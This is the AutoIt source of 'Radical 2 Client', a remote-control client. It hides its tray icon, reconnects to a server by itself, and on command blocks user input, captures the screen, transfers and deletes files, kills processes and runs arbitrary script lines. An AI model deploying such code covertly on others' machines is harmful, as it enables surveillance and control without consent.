; Radical 2 Client by Andrew Dunn
; Requires Server Version 0.5.4.0

#NoTrayIcon

FileChangeDir(@ScriptDir)

#include <IE.au3>
#include <Inet.au3>
#include <Misc.au3>
#include <ScreenCapture.au3>
#Include <File.au3>

#include "CompInfo.au3"

Global $DoingFileTransfer  = 0
Global $FileTransferPath   = 0
Global $FileTransferSize   = 0
Global $FileTransferFile   = 0
Global $FileTransferType   = 0
Global $FileTransferTicket = 0

Global $Server_Locator_PID = -1
Global $Main_Socket = -1

If $CmdLine[0] >= 3 Then
	If $CmdLine[1] == "FileUpload" Then
		$DoingFileTransfer  = 1
		$FileTransferPath   = $CmdLine[2]
		$FileTransferFile   = StringRight($FileTransferPath, StringLen($FileTransferPath) - StringInStr($FileTransferPath, "\", 0, -1))
		$FileTransferType   = "up"
		$FileTransferTicket = $CmdLine[3]
		
		If FileExists($FileTransferPath) = 0 Then Exit
	ElseIf $CmdLine[1] == "FileDownload" Then
		$DoingFileTransfer  = 1
		$FileTransferPath   = $CmdLine[2]
		$FileTransferFile   = StringRight($FileTransferPath, StringLen($FileTransferPath) - StringInStr($FileTransferPath, "\", 0, -1))
		$FileTransferType   = "down"
		$FileTransferSize   = $CmdLine[3]
		$FileTransferTicket = $CmdLine[4]
	Else
		MsgBox(0, "Error", "Client was run with invalid command parameters.")
		Exit
    EndIf
EndIf

Global $servip, $connect_port

Global $PC_ID

Global $recv = ""

Global $Packet_Buffer = ""

Global $IP_Address = @IPAddress1

Global $User_Name = IniRead("settings.ini", "settings", "username", @UserName & "@" & @ComputerName)

Global $User_Input_Blocked = 0

FileChangeDir(@ScriptDir)

TCPStartup()

;~ If _Singleton("RCC\Client", 1) = 0 Then
;~ 	Exit
;~ EndIf

ConnectToServer()

If $DoingFileTransfer  = 1 Then
	
	$timeout = TimerInit()
	
	If $FileTransferType = "up" Then
		SendPacketToServer("~~StartUpload|" & FileGetSize($FileTransferPath))
		if WaitForMessage("~~ReadyToRecieve" & Chr(127) & "~~ErrorDontSend") = 1 Then
			SendFile($FileTransferPath)
		EndIf
	ElseIf $FileTransferType = "down" Then
		DownloadFile($FileTransferFile, $FileTransferPath, $FileTransferSize)
	EndIf
		
	Exit
EndIf

While 1
	$recv = TCPRecv($Main_Socket, 10000)
	If @error Then
		If $DoingFileTransfer = 0 Then
			ConnectToServer()
		Else
			Exit
		EndIf
	EndIf
	
	Select
		Case $recv <> ""
			$Packet_Buffer &= $recv
			If StringRight($Packet_Buffer,1) = Chr(127) Then
				$Buffer_Split = StringSplit($Packet_Buffer, Chr(127))
				SetClientStatus(1,"Parsing Commands")
				for $packetcount = 1 to $Buffer_Split[0] Step 1
					if $Buffer_Split[$packetcount] <> "" Then 
						ParseAndExcute($Buffer_Split[$packetcount])
					EndIf
				Next
				SetClientStatus(0,"Idle")
				$Packet_Buffer = ""
			EndIf
	EndSelect

	If $User_Input_Blocked = 1 Then
		BlockInput(1)
	EndIf
WEnd

Func ConnectToServer()
	
	$Connect_Trys = 0
	
	Do
		TCPCloseSocket($Main_Socket)
		$Main_Socket = -1
		
		While 1
			$servip = TCPNameToIP(IniRead(@ScriptDir & "\settings.ini", "settings", "ip", @IPAddress1))
			$connect_port = IniRead(@ScriptDir & "\settings.ini", "settings", "port", 1365)
			
			$PC_ID = IniRead("settings.ini", "settings", "PC_ID", -1)
;~ 			TrayTip("Client", "Connecting to " & $servip & " " & $connect_port, 5)
			$Main_Socket = TCPConnect($servip, $connect_port)
			If Not @error Then ExitLoop
			$Connect_Trys += 1
			
;~          Unfinished feature that searches for the server
;~ 			If $Connect_Trys > 5 Then
;~ 				If ProcessExists($Server_Locator_PID) = 0 Then
;~ 					$Server_Locator_PID = Run(@AutoItExe & " /AutoIt3ExecuteScript ""Server Locator.au3""", @ScriptDir)
;~ 				EndIf
;~ 				$Connect_Trys = 0
;~ 			EndIf
			
			If $Connect_Trys > 3 And $DoingFileTransfer = 1 Then Exit
			
			Sleep(1000)
		WEnd
		
		If $DoingFileTransfer = 0 Then
			TCPSend($Main_Socket, "~~username|" & $User_Name & "|" & $IP_Address & "|" & $PC_ID)
		Else
			If $FileTransferType = "up" Then
				TCPSend($Main_Socket, "~~FileTransfer|Upload|" & $IP_Address & "|" & $FileTransferFile & "|" & $FileTransferTicket)
			Else
				TCPSend($Main_Socket, "~~FileTransfer|Download|" & $IP_Address & "|" & $FileTransferTicket)
			EndIf
		EndIf
		
		$timeout = TimerInit()

		$recv = ""
		
		Do
			$recv = TCPRecv($Main_Socket, 512)
			Sleep(1)
			If TimerDiff($timeout) > 5000 Then
				TCPCloseSocket($Main_Socket)
				ExitLoop
			EndIf
		Until StringInStr($recv, "~~accepted") Or StringInStr($recv, "~~rejected")
		
		If StringInStr($recv, "~~rejected") Then
			If $DoingFileTransfer = 0 Then
				Sleep(300000)
			Else
				Exit
			EndIf
		EndIf
		
	Until StringInStr($recv, "~~accepted")

	ProcessClose($Server_Locator_PID)

	$Split = StringSplit($recv, "|")
	If $Split[0] > 1 Then
		$PC_ID = $Split[2]
		IniWrite("settings.ini", "settings", "PC_ID", $PC_ID)
	EndIf
	
	$recv = ""
	$Packet_Buffer = ""
	
	Return 1
	
EndFunc   ;==>ConnectToServer

Func SetClientStatus($IsBusy = 0, $Status_Description = "Idle")
	Return TCPSend($Main_Socket, "~~SetClientStatus|" & $IsBusy & "|" & $Status_Description & "|" & Chr(127))
EndFunc

Func SendPacketToServer($Packet_Data)
	Return TCPSend($Main_Socket, $Packet_Data & Chr(127))
EndFunc   ;==>SendPacketToServer

Func WaitForMessage($Message, $MessageTimout = 5000)
	$WaitTimer = TimerInit()
	
	$Message = StringSplit($Message, Chr(127))
	
	$rec = ""
	
	While 1
		$rec = TCPRecv($Main_Socket, 10000)
		if @error Then Return 0
		
		For $i = 1 to $Message[0] step 1
			if StringInStr($rec, $Message[$i]) > 0 Then Return $i
		next
		
		If TimerDiff($WaitTimer) >= $MessageTimout Then Return 0
	WEnd
EndFunc

Func ParseAndExcute($Net_Msg = "")
	
	$Current_Packet = StringSplit($Net_Msg, "|")
	
	For $ii = 1 To $Current_Packet[0] Step 1
		$Current_Packet[$ii] = StringReplace($Current_Packet[$ii], "@PIPE", "|")
	Next
	
	Switch $Current_Packet[1]
		Case "~~Ping"
			SendPacketToServer("~~Ping")
		Case "~~Exit_Client"
			Exit
		Case "~~Disconnect_Client"
			TCPCloseSocket($Main_Socket)
			Sleep(5000)
		Case "~~SetUserName"
			IniWrite("settings.ini", "settings", "username", $Current_Packet[2])
			SendPacketToServer("~~SetUserName|" & $Current_Packet[2])
			$User_Name = $Current_Packet[2]
		Case "~~BlockUserInput"
			$User_Input_Blocked = 1
			BlockInput(1)
		Case "~~EnableUserInput"
			$User_Input_Blocked = 0
			BlockInput(0)
		Case "~~MessageBox"
			Run(@AutoItExe & "  /ErrorStdOut /AutoIt3ExecuteLine ""MsgBox(64, """"Message from the Server"""", """"" & StringReplace($Current_Packet[2],'"','""') & """"")""",@ScriptDir)
		Case "~~OpenLinkInIE"
			_IECreate($Current_Packet[2], -1, -1, 0)
		Case "~~ShellExecute"
			$last_backslash = StringInStr($Current_Packet[2], "\", 0, -1)
			$Working_Dir = StringLeft($Current_Packet[2], $last_backslash - 1)
			ShellExecute($Current_Packet[2], "", $Working_Dir)
		Case "~~CreateFolder"
			DirCreate($Current_Packet[2])
		Case "~~DeleteFolder"
			DirRemove($Current_Packet[2], 1)
		Case "~~DeleteFile"
			FileDelete($Current_Packet[2])
		case "~~StartFileUpload"
			If @Compiled = True Then
				Run(@AutoItExe & " FileUpload """ & $Current_Packet[2] & """ " & $Current_Packet[3], @ScriptDir)
			Else
				Run(@AutoItExe & " """ & @ScriptFullPath & """ FileUpload """ & $Current_Packet[2] & """ " & $Current_Packet[3], @ScriptDir)
			EndIf
		case "~~StartFileDownload"
			If @Compiled = True Then
				Run(@AutoItExe & " FileDownload """ & $Current_Packet[2] & """ " & $Current_Packet[3] & " " & $Current_Packet[4], @ScriptDir)
			Else
				Run(@AutoItExe & " """ & @ScriptFullPath & """ FileDownload """ & $Current_Packet[2] & """ " & $Current_Packet[3] & " " & $Current_Packet[4], @ScriptDir)
			EndIf
		Case "~~CustomCommand"
			$Custom_Script_File = FileOpen($Current_Packet[2], 0)
			If $Custom_Script_File = -1 Then
				SendPacketToServer("~~ConsoleMessage|Error cannot find script: " & $Current_Packet[2])
				Return 1
			EndIf
			
			While 1
				$read = FileReadLine($Custom_Script_File)
				If @error Then ExitLoop
				If $read <> "" Then Execute($read)
			WEnd
			
			FileClose($Custom_Script_File)
		Case "~~RunPlugin"
			$run = Plugin_Run(@ScriptDir & "\Plugins\" & $Current_Packet[2], $Current_Packet[3], $servip)
			If Not @error Then
				SendPacketToServer("~~ConsoleMessage|""" & $Current_Packet[2] & """ plugin was started, PID: " & $run)
			Else
				SendPacketToServer("~~ConsoleMessage|Error running the """ & $Current_Packet[2] & """ plugin script")
			EndIf
		Case "~~GetScreenShot"
			SetClientStatus(1,"Sending Screenshot")
			
			_ScreenCapture_SetJPGQuality($Current_Packet[2])
			
			_ScreenCapture_Capture(@ScriptDir & "\tempscreen.jpg")
			
			SendPacketToServer("~~SendingScreenshot|" & FileGetSize(@ScriptDir & "\tempscreen.jpg") & "|")
			
			If (WaitForMessage("~~ReadyToRecieveScreenshot" & Chr(127) & "~~ErrorDontSend", 5000) = 1) And FileExists(@ScriptDir & "\tempscreen.jpg") Then SendFile(@ScriptDir & "\tempscreen.jpg")
				
			WaitForMessage("~~DoneRecieving", 5000)
			
		Case "~~KillProcess"
			ProcessClose($Current_Packet[2])
			ProcessWaitClose($Current_Packet[2], 5)
		Case "~~GetFileSystemRoot"
			SetClientStatus(1,"Getting File Root")
			
			SendPacketToServer("~~SetFileExploreLabel|Collecting root list ...|")
			
			SendPacketToServer("~~DirExploreAddRootItem|Current User's Desktop|" & @DesktopDir & "|")
			SendPacketToServer("~~DirExploreAddRootItem|All User's Desktop|" & @DesktopCommonDir & "|")
			SendPacketToServer("~~DirExploreAddRootItem|Current User's Documents|" & @MyDocumentsDir & "|")
			SendPacketToServer("~~DirExploreAddRootItem|All User's Documents|" & @DocumentsCommonDir & "|")
			SendPacketToServer("~~DirExploreAddRootItem|Current User's Start Menu Programs|" & @ProgramsDir & "|")
			SendPacketToServer("~~DirExploreAddRootItem|All User's Start Menu Programs|" & @ProgramsCommonDir & "|")
			SendPacketToServer("~~DirExploreAddRootItem|User's Profile|" & @UserProfileDir & "|")
			SendPacketToServer("~~DirExploreAddRootItem|Program Files Dir|" & @ProgramFilesDir & "|")
			
			$DriveList = DriveGetDrive("all")
			
			For $i = 1 to $DriveList[0] Step 1
				SendPacketToServer("~~DirExploreAddRootItem|(" & $DriveList[$i] & ") " & DriveGetLabel($DriveList[$i]) & "|" & $DriveList[$i] & "|")
			Next
			
			SendPacketToServer("~~SetFileExploreLabel|Done refreshing root list|")
			
			SendPacketToServer("~~DoneUpdatingLists")
		Case "~~GetFolderList"
			SetClientStatus(1,"Getting Folder List")
			
			SendPacketToServer("~~SetFileExploreLabel|Collecting folder list ...|")
			
			$FolderList = _FileListToArray($Current_Packet[2], "*", 2)
			If @error = 0 Then
				For $i = 1 to $FolderList[0] Step 1
					SendPacketToServer("~~DirExploreAddItem|" & $FolderList[$i] & "|" & $Current_Packet[2] & "\" & $FolderList[$i] & "|")
				Next
			EndIf
			
			SendPacketToServer("~~SetFileExploreLabel|Done refreshing folder list|")
			
		Case "~~GetFileList"
			
			SetClientStatus(1,"Getting File List")
			
			SendPacketToServer("~~SetFileExploreLabel|Collecting file list ...|")
			
			$FileList = _FileListToArray($Current_Packet[2], "*", 1)
			If @error = 0 Then
				For $i = 1 to $FileList[0] Step 1
					SendPacketToServer("~~FileExploreAddItem|" & $FileList[$i] & "|" & _GetExtProperty($Current_Packet[2] & "\" & $FileList[$i], 2) & "|" & $Current_Packet[2] & "\" & $FileList[$i] & "|")
				Next
			EndIf
			
			SendPacketToServer("~~SetFileExploreLabel|Done refreshing file list|")
			SendPacketToServer("~~DoneUpdatingLists")
			
		Case "~~GetProcessList"
			SetClientStatus(1,"Getting Process List")
			
			$ProcessList = _ProcessListProperties()
			SendPacketToServer("~~SetProcessStatLabel|Getting info for " & $ProcessList[0][0] & " processes found on " & $User_Name & " (" & $IP_Address & ") ...")
			
			For $i = 1 To $ProcessList[0][0] Step 1
				if $ProcessList[$i][0] = "" And $ProcessList[$i][1] = "" Then ContinueLoop
				
				SendPacketToServer("~~AddProcessToList|" & _ 
								   StringReplace($ProcessList[$i][1], "|", "@PIPECHAR") & "|" & _ ; Process PID
								   StringReplace($ProcessList[$i][0], "|", "@PIPECHAR") & "|" & _ ; Process Name
								   StringReplace($ProcessList[$i][3], "|", "@PIPECHAR") & "|" & _ ; User Name
								   StringReplace($ProcessList[$i][6], "|", "@PIPECHAR") & "|" & _ ; CPU Usage
								   Round($ProcessList[$i][7] / 1024, 0) & " KB|" & _ ; Memory Usage
								   StringReplace($ProcessList[$i][4], "|", "@PIPECHAR") & "|" & _ ; Priority
								   StringReplace($ProcessList[$i][5], "|", "@PIPECHAR") & "|" & _ ; Excutable Path
								   StringReplace($ProcessList[$i][9], "|", "@PIPECHAR") & "|")    ; Command Parameters
			Next

			SendPacketToServer("~~SetProcessStatLabel|Done getting info for " & $ProcessList[0][0] & " processes on " & $User_Name & " (" & $IP_Address & ")")
			
		Case "~~GetCompGeneralInfo"
			SendPacketToServer("~~CompGeneralInfo|" & @ComputerName & "|" & _
							   @UserName & "|" & _
							   @OSVersion & "|" & _
							   @IPAddress1 & "|" & _
							   @DesktopWidth & " x " & @DesktopHeight & "|" & _
							   @HOUR & ":" & @MIN & ":" & @SEC & " " & @MON & "/" & @MDAY & "/" & @YEAR & "|")
			Return 1
		Case "~~GetCompSystemInfo"
			SetClientStatus(1,"Getting System Info")
			
			SendPacketToServer("~~CompSystemInfo|Just hold on a sec I'm loading!|Loading ... |Loading ... |Loading ...|Loading ...|Loading ...|")
			$SystemInfo = _ComputerGetSystem()
			if IsArray($SystemInfo) Then
				if $SystemInfo[0][0] >= 1 Then
					$Domain = $SystemInfo[1][13]
					if StringStripWS($Domain,8) = "" Then $Domain = $SystemInfo[1][51]
					
					SendPacketToServer("~~CompSystemInfo|" & $Domain & "|" & _
									   $SystemInfo[1][21] & "|" & _
									   $SystemInfo[1][22] & "|" & _
									   $SystemInfo[1][36] & "|" & _
									   $SystemInfo[1][44] & "|" & _
									   $SystemInfo[1][46] & "|")
					Return 1
				EndIf
			EndIf
			
			SendPacketToServer("~~CompSystemInfo|Error: Client was unable to get info|Reason: _ComputerGetSystem() failed!|Error|Error|Error|Error|")
			
		Case "~~GetCompProcessorInfo"
			
			SetClientStatus(1, "Getting Processor Info")
			
			SendPacketToServer("~~CompProcessorInfo|Just hold on a sec I'm loading!|Loading ... |Loading ... |Loading ... |Loading ...|Loading ...|Loading ...|")
			
			$SystemInfo = _ComputerGetProcessors()
			if @error Then
				SendPacketToServer("~~CompProcessorInfo|Error: Client was unable to get info|Reason: _ComputerGetProcessors() failed!|Error|Error|Error|Error|Error|")
			Else
				if $SystemInfo[0][0] >= 1 Then
					SendPacketToServer("~~CompProcessorInfo|" & _
									   $SystemInfo[0][0] & "|" & _
									   $SystemInfo[1][0] & "|" & _
									   $SystemInfo[1][4] & "|" & _
									   $SystemInfo[1][9] & " MHz|" & _
									   $SystemInfo[1][1] & " bit|" & _
									   $SystemInfo[1][17] & "|" & _
									   $SystemInfo[1][32] & "|")
					Return 1
				EndIf
			EndIf
			
		Case "~~GetCompMemoryInfo"
			
			SetClientStatus(1,"Getting Memory Info")
			
			SendPacketToServer("~~CompMemoryInfo|Just hold on a sec I'm loading!|Loading ...|Loading ...|Loading ...|")
			$SystemInfo = _ComputerGetSystem()
			if @error then
				SendPacketToServer("~~CompMemoryInfo|Error: Unable to get system info|Error: Unable to get system info|Error: Unable to get system info|Error: Unable to get system info|")
			Else
				$SystemInfo2 = _ComputerGetMemory()
				if @error Then
					SendPacketToServer("~~CompMemoryInfo|Error: Unable to get RAM info|Error: Unable to get RAM info|Error: Unable to get RAM info|Error: Unable to get RAM info|")
				Else
					if $SystemInfo[0][0] >= 1 Then
						$Ram_Capacity = ""
						$Ram_Speeds = ""
						
						If $SystemInfo2[0][0] > 1 Then
							For $ii = 1 to $SystemInfo2[0][0] Step 1
								$Ram_Capacity &= $ii & ") " & Round($SystemInfo2[$ii][2] / 1048576, 0) & " MB"
								$Ram_Speeds &= $ii & ") " & $SystemInfo2[$ii][22] & " MHz"
								If $ii < $SystemInfo2[0][0] Then 
									$Ram_Capacity &= ", "
									$Ram_Speeds &= ", "
								EndIf
							Next
						Else
							$Ram_Capacity = "1) " & Round($SystemInfo2[1][2] / 1048576, 0) & " MB"
							$Ram_Speeds = "1) " & $SystemInfo2[1][22] & " MHz"
						EndIf
						
						SendPacketToServer("~~CompMemoryInfo|" & _
										   Round($SystemInfo[1][48] / 1048576, 0) & " MB|" & _
										   $SystemInfo2[0][0] & "|" & _
										   $Ram_Capacity & "|" & _
									       $Ram_Speeds & "|")
					EndIf
				EndIf
			EndIf
		
		Case "~~GetCompVideoInfo"
		
			SetClientStatus(1,"Getting Video Card Info")
		
			SendPacketToServer("~~CompVideoInfo|Just hold on a sec I'm loading!|Loading ...|Loading ...|Loading ...|Loading ...|Loading ...|")
			$SystemInfo = _ComputerGetVideoCards()
			if @error then
				SendPacketToServer("~~CompVideoInfo|Error: Client was unable to get info|Reason: _ComputerGetVideoCards() failed!|Error|Error|Error|Error|")
			Else
				$VideoCardNames = ""
				$VideoProcessors = ""
				$VideoMemory = ""
				$VideoModes = ""
				$RefreshRates = ""
				
				If $SystemInfo[0][0] > 1 Then
					For $ii = 1 To $SystemInfo[0][0] Step 1
						$VideoCardNames &= $ii & ") " & $SystemInfo[$ii][0]
						$VideoProcessors &= $ii & ") " & $SystemInfo[$ii][56]
						$VideoMemory &= $ii & ") " & Round($SystemInfo[$ii][5] / 1048576, 0) & " MB"
						$VideoModes &= $ii & ") " & $SystemInfo[$ii][55]
						$RefreshRates &= $ii & ") " & $SystemInfo[$ii][17] & " Hz"
						If $ii < $SystemInfo[0][0] Then
							$VideoCardNames &= ", "
							$VideoProcessors &= ", "
							$VideoMemory &= ", "
							$VideoModes &= ", "
							$RefreshRates &= ", "
						EndIf
					Next
				Else
					$VideoCardNames = $SystemInfo[1][0]
					$VideoProcessors = $SystemInfo[1][56]
					$VideoMemory = Round($SystemInfo[1][5] / 1048576, 0) & " MB"
					$VideoModes = $SystemInfo[1][55]
					$RefreshRates = $SystemInfo[1][17] & " Hz"
				EndIf
				
				SendPacketToServer("~~CompVideoInfo|" & _
								   $SystemInfo[0][0] & "|" & _
								   $VideoCardNames & "|" & _
								   $VideoProcessors & "|" & _
								   $VideoMemory & "|" & _
								   $VideoModes & "|" & _
								   $RefreshRates & "|")
			EndIf
			
		Case Else
			SendPacketToServer("~~ConsoleMessage|Error Unknown Command: " & $Current_Packet[1])
	EndSwitch
	
	Return 1
EndFunc   ;==>ParseAndExcute

Func Plugin_Run($Plugin_Path, $Plugin_Port, $Parm_Command_1 = "", $Parm_Command_2 = "", $Parm_Command_3 = "", $Parm_Command_4 = "", $Parm_Command_5 = "", $Parm_Command_6 = "")

	If StringRight($Plugin_Path, 3) = "au3" Then
		$Plugin_Run_Path = @AutoItExe & " /AutoIt3ExecuteScript """ & $Plugin_Path & """ """ & $Plugin_Port & """"
	Else
		$Plugin_Run_Path = $Plugin_Path & " """ & $Plugin_Port & """"
	EndIf
	
	For $i = 1 To 6 Step 1
		If Eval("Parm_Command_" & $i) <> "" Then
			$Plugin_Run_Path = $Plugin_Run_Path & " """ & Eval("Parm_Command_" & $i) & """"
		Else
			ExitLoop
		EndIf
	Next

	$Run_Pid = Run($Plugin_Run_Path, @ScriptDir)
	If @error Then
		SetError(1)
		Return 0
	EndIf
	
	Return $Run_Pid
	
EndFunc   ;==>Plugin_Run

Func SendFile($FilePath)
	$FileOpen = FileOpen($FilePath, 0)
	
	$FileSize = FileGetSize($FilePath)
	
	$BytesSent = 0
	
	While $BytesSent < $FileSize
		$ReadFile = FileRead($FileOpen, 4096)
		If TCPSend($Main_Socket, $ReadFile) = 0 Then ExitLoop
	WEnd
	
	FileClose($FileOpen)
EndFunc

Func DownloadFile($FileName, $FilePath, $FileSize)
	$FileOpen = FileOpen(@ScriptDir & "\temp downloads\" & $FileName, 10)
	If $FileOpen = -1 Then Return 0
	
	SendPacketToServer("~~StartDownload")
	
	$BytesRec = 0
	$timer = TimerInit()
	
	While $BytesRec < $FileSize
		$data = TCPRecv($Main_Socket, 10000)
		If @error then ExitLoop
		FileWrite($FileOpen, $data)
		If TimerDiff($timer) > 5000 Then ExitLoop
		$timer = TimerInit()
	WEnd
	
	FileClose($FileOpen)
	
	If FileGetSize(@ScriptDir & "\temp downloads\" & $FileName) >= $FileSize Then
		FileMove(@ScriptDir & "\temp downloads\" & $FileName, $FilePath, 1)
	Else
		FileDelete(@ScriptDir & "\temp downloads\" & $FileName)
	EndIf
EndFunc

Func Panic_Close()
	
	Exit
	
EndFunc   ;==>Panic_Close

;===============================================================================
; Function Name:    _ProcessListProperties()
; Description:   Get various properties of a process, or all processes
; Call With:       _ProcessListProperties( [$Process [, $sComputer]] )
; Parameter(s):     (optional) $Process - PID or name of a process, default is all
;           (optional) $sComputer - remote computer to get list from, default is local
; Requirement(s):   AutoIt v3.2.4.9+
; Return Value(s):  On Success - Returns a 2D array of processes, as in ProcessList()
;             with additional columns added:
;             [0][0] - Number of processes listed (can be 0 if no matches found)
;             [1][0] - 1st process name
;             [1][1] - 1st process PID
;             [1][2] - 1st process Parent PID
;             [1][3] - 1st process owner
;             [1][4] - 1st process priority (0 = low, 31 = high)
;             [1][5] - 1st process executable path
;             [1][6] - 1st process CPU usage
;             [1][7] - 1st process memory usage
;             [1][8] - 1st process creation date/time = "MM/DD/YYY hh:mm:ss" (hh = 00 to 23)
;             [1][9] - 1st process command line string
;             ...
;             [n][0] thru [n][8] - last process properties
; On Failure:       Returns array with [0][0] = 0 and sets @Error to non-zero (see code below)
; Author(s):        PsaltyDS at http://www.autoitscript.com/forum
; Date/Version:   05/07/2008  --  v1.0.1
; Notes:            If a numeric PID or string process name is provided and no match is found,
;             then [0][0] = 0 and @error = 0 (not treated as an error, same as ProcessList)
;           This function requires admin permissions to the target computer.
;           All properties come from the Win32_Process class in WMI.
;===============================================================================
Func _ProcessListProperties($Process = "", $sComputer = ".")
    Local $sUserName, $sMsg, $sUserDomain, $avProcs
    If $Process = "" Then
        $avProcs = ProcessList()
    Else
        $avProcs = ProcessList($Process)
    EndIf

; Return for no matches
    If $avProcs[0][0] = 0 Then Return $avProcs

; ReDim array for additional property columns
    ReDim $avProcs[$avProcs[0][0] + 1][10]

; Connect to WMI and get process objects
    $oWMI = ObjGet("winmgmts:{impersonationLevel=impersonate}!\\" & $sComputer & "\root\cimv2")
    If IsObj($oWMI) Then
    ; Get collection of all processes from Win32_Process
        $colProcs = $oWMI.ExecQuery("select * from win32_process")
        If IsObj($colProcs) Then
        ; For each process...
            For $oProc In $colProcs
                $sObjName = ObjName($oProc, 1)
                If @error Then ContinueLoop; Skip if process no longer exists
            ; Find it in the array
                For $n = 1 To $avProcs[0][0]
                    If $avProcs[$n][1] = $oProc.ProcessId and ProcessExists($avProcs[$n][1]) Then

                    ; [n][2] = Parent PID
                        $avProcs[$n][2] = $oProc.ParentProcessId
                    ; [n][3] = Owner
                        If $oProc.GetOwner($sUserName, $sUserDomain) = 0 Then $avProcs[$n][3] = $sUserDomain & "\" & $sUserName
                    ; [n][4] = Priority
                        $avProcs[$n][4] = $oProc.Priority
                    ; [n][5] = Executable path
                        $avProcs[$n][5] = $oProc.ExecutablePath
                    ; [n][8] = Creation date/time
                        Local $dtmDate = $oProc.CreationDate
                        If $dtmDate <> "" Then
                            $dtmDate = StringMid($dtmDate, 5, 2) & "/" & _
                                    StringMid($dtmDate, 7, 2) & "/" & _
                                    StringLeft($dtmDate, 4) & " " & _
                                    StringMid($dtmDate, 9, 2) & ":" & _
                                    StringMid($dtmDate, 11, 2) & ":" & _
                                    StringMid($dtmDate, 13, 2)
                        EndIf
                        $avProcs[$n][8] = $dtmDate
                    ; [n][9] = Command line string
                        $avProcs[$n][9] = $oProc.CommandLine

                        ExitLoop
                    EndIf
                Next
            Next
        Else
            SetError(2); Error getting process collection from WMI
        EndIf

    ; Get collection of all processes from Win32_PerfFormattedData_PerfProc_Process
    ; Have to use an SWbemRefresher to pull the collection, or all Perf data will be zeros
        Local $oRefresher = ObjCreate("WbemScripting.SWbemRefresher")
        $colProcs = $oRefresher.AddEnum($oWMI, "Win32_PerfFormattedData_PerfProc_Process" ).objectSet
        $oRefresher.Refresh

    ; Time delay before calling refresher
        Local $iTime = TimerInit()
        Do
            Sleep(10)
        Until TimerDiff($iTime) > 100
        $oRefresher.Refresh

    ; Get PerfProc data
        For $oProc In $colProcs
        ; Find it in the array
            For $n = 1 To $avProcs[0][0]
                If $avProcs[$n][1] = $oProc.IDProcess Then
                ; [n][6] = CPU usage
                    $avProcs[$n][6] = $oProc.PercentProcessorTime
                ; [n][7] = memory usage
                    $avProcs[$n][7] = $oProc.WorkingSet
                    ExitLoop
                EndIf
            Next
        Next
    Else
        SetError(1); Error connecting to WMI
    EndIf

; Return array
    Return $avProcs
EndFunc  ;==>_ProcessListProperties


;===============================================================================
; Function Name:	GetExtProperty($sPath,$iProp)
; Description:      Returns an extended property of a given file.
; Parameter(s):     $sPath - The path to the file you are attempting to retrieve an extended property from.
;                   $iProp - The numerical value for the property you want returned. If $iProp is is set
;							  to -1 then all properties will be returned in a 1 dimensional array in their corresponding order.
;							The properties are as follows:
;							Name = 0
;							Size = 1
;							Type = 2
;							DateModified = 3
;							DateCreated = 4
;							DateAccessed = 5
;							Attributes = 6
;							Status = 7
;							Owner = 8
;							Author = 9
;							Title = 10
;							Subject = 11
;							Category = 12
;							Pages = 13
;							Comments = 14
;							Copyright = 15
;							Artist = 16
;							AlbumTitle = 17
;							Year = 18
;							TrackNumber = 19
;							Genre = 20
;							Duration = 21
;							BitRate = 22
;							Protected = 23
;							CameraModel = 24
;							DatePictureTaken = 25
;							Dimensions = 26
;							Width = 27
;							Height = 28
;							Company = 30
;							Description = 31
;							FileVersion = 32
;							ProductName = 33
;							ProductVersion = 34
; Requirement(s):   File specified in $spath must exist.
; Return Value(s):  On Success - The extended file property, or if $iProp = -1 then an array with all properties
;                   On Failure - 0, @Error - 1 (If file does not exist)
; Author(s):        Simucal (Simucal@gmail.com)
; Note(s):
;
;===============================================================================
Func _GetExtProperty($sPath, $iProp)
	Local $iExist, $sFile, $sDir, $oShellApp, $oDir, $oFile, $aProperty, $sProperty
	$iExist = FileExists($sPath)
	If $iExist = 0 Then
		SetError(1)
		Return 0
	Else
		$sFile = StringTrimLeft($sPath, StringInStr($sPath, "\", 0, -1))
		$sDir = StringTrimRight($sPath, (StringLen($sPath) - StringInStr($sPath, "\", 0, -1)))
		$oShellApp = ObjCreate ("shell.application")
		$oDir = $oShellApp.NameSpace ($sDir)
		$oFile = $oDir.Parsename ($sFile)
		If $iProp = -1 Then
			Local $aProperty[35]
			For $i = 0 To 34
				$aProperty[$i] = $oDir.GetDetailsOf ($oFile, $i)
			Next
			Return $aProperty
		Else
			$sProperty = $oDir.GetDetailsOf ($oFile, $iProp)
			If $sProperty = "" Then
				Return 0
			Else
				Return $sProperty
			EndIf
		EndIf
	EndIf
EndFunc   ;==>_GetExtProperty

Func OnAutoItExit()
	ProcessClose($Server_Locator_PID)
	TCPSend($Main_Socket, "~~ProgramShutdown")
	TCPCloseSocket($Main_Socket)
	TCPShutdown()
EndFunc   ;==>OnAutoItExit